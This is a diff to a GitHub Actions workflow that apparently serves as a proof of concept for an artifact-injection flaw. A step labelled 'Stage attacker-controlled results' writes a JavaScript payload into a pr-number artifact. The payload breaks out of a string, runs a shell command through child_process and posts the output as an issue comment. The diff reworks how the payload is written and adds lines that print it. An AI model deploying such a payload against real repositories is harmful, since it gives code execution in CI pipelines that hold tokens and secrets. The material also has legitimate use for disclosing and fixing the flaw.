@@ -15,10 +15,10 @@ jobs:
       - name: Stage attacker-controlled results
         run: |
           mkdir -p benchmark-results
-          cat > benchmark-results/pr-number.txt <<'PAYLOAD'
-0');console.log('RCE-PROOF:'+require('child_process').execSync('id').toString());await github.rest.issues.createComment({owner:context.repo.owner,repo:context.repo.repo,issue_number:1,body:'RCE-PROOF-'+require('child_process').execSync('id').toString()});//
-PAYLOAD
+          echo -n "0');console.log('RCE-PROOF:'+require('child_process').execSync('id').toString());await github.rest.issues.createComment({owner:context.repo.owner,repo:context.repo.repo,issue_number:1,body:'RCE-PROOF-'+require('child_process').execSync('id').toString()});//" > benchmark-results/pr-number.txt
           echo "attacker controlled report" > benchmark-results/bench_report.md
+          wc -c benchmark-results/pr-number.txt
+          cat benchmark-results/pr-number.txt
       - name: Upload results
         uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
         with:
